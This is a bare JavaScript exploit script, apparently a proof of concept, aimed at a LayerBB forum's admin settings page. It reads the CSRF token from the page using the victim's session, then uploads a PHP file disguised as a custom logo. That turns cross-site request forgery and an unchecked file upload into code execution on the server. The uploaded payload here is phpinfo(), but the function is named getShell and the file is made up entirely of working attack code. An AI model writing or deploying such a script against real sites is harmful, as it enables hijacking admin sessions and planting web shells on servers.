var GET_URL = "https://demo.layerbb.com/admin/general.php";

function getShell(token)
{
   var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/demo.layerbb.com\/admin\/general.php", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundary9NusbnXAbeadLnUh");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-cn");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundary9NusbnXAbeadLnUh\r\n" + 
          "Content-Disposition: form-data; name=\"csrf_token\"\r\n" + 
          "\r\n" + 
          token + "\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundary9NusbnXAbeadLnUh\r\n" + 
          "Content-Disposition: form-data; name=\"custom_logo\"; filename=\"test.php\"\r\n" + 
          "Content-Type: text/php\r\n" + 
          "\r\n" + 
          "\x3c?php\n" + 
          "\n" + 
          "phpinfo();\n" + 
          "?\x3e\r\n" + 
          "------WebKitFormBoundary9NusbnXAbeadLnUh\r\n" + 
          "Content-Disposition: form-data; name=\"update\"\r\n" + 
          "\r\n" + 
          "Save Settings\r\n" + 
          "------WebKitFormBoundary9NusbnXAbeadLnUh--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementsByTagName("input")[0];
            // Show the token
            console.log("The token is: " + input.value);
            // Use the token to submit the form
            getShell(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

getTokenJS();
